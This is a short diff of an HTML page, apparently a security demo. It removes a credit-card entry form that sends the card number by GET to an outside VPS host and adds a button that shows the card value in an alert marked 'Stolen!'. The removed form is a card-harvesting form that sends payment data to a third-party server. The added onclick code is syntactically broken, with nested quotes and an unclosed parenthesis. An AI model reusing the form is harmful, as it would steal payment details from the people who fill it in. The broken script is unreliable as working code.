@@ -1,4 +1,2 @@
-<form method="GET" action="http://vps219573.vps.ovh.ca/action.php">
-  <label>Enter Your Credit Card Details: </label><input name="cardnum" type="text"/><br>
-  <input type="submit" value="Complete Transaction">
-</form>
+<label>Enter Your Credit Card Details: </label><input id="card" name="cardnum" type="text"/><br>
+<input type="submit" value="Complete Transaction" onclick="javascript:alert("Card # " + document.getElementById("card"); "Stolen!")">
